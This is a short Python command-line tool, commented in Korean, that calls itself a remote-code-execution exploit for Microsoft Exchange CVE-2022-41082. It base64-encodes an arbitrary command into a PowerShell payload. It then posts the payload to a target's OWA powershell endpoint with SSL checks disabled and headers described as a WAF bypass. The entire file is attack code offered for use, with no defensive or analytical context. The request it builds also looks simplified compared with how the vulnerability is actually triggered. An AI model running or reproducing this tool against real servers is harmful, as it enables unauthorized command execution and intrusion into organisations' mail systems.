import requests
import argparse
import base64
import warnings

# SSL 경고 무시
warnings.simplefilter('ignore', category=UserWarning)

# Base64 인코딩
def encode_base64(cmd):
    return base64.b64encode(cmd.encode()).decode()

# HTTP 요청 헤더 변조 (WAF 우회)
HEADERS = {
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
    "Content-Type": "application/soap+xml; charset=utf-8",
    "Accept": "*/*",
}

# CVE-2022-41082 Exploit (Exchange Server RCE via /powershell endpoint)
def exploit_cve_2022_41082(target_url, cmd):
    try:
        encoded_cmd = encode_base64(cmd)
        payload = f"powershell -EncodedCommand {encoded_cmd}"

        exploit_url = f"{target_url}/owa/mastermailbox%40outlook.com/powershell"
        
        response = requests.post(exploit_url, headers=HEADERS, data=payload, verify=False, timeout=10)
        
        print("[DEBUG] Response Headers:", response.headers)
        print("[DEBUG] Response Body:", response.text)

        if response.status_code == 200:
            print("[SUCCESS] CVE-2022-41082 Exploit sent successfully!")
            print("Server Response:")
            print(response.text)
        else:
            print("[FAIL] CVE-2022-41082 Exploit failed. Check target and parameters.")
    except requests.exceptions.RequestException as err:
        print(f"[ERROR] {err}")
        print("[FAIL] Exploit attempt failed.")

# 메인 함수
def main():
    parser = argparse.ArgumentParser(
        description="Microsoft Exchange Server CVE-2022-41082 RCE Exploit Tool",
        usage="python3 exploit.py --url <URL> --cmd <COMMAND>"
    )
    parser.add_argument("--url", required=True, help="Target URL")
    parser.add_argument("--cmd", required=True, help="Command to execute")

    args = parser.parse_args()

    print("[INFO] Attempting exploitation...")
    exploit_cve_2022_41082(args.url, args.cmd)

if __name__ == "__main__":
    main()
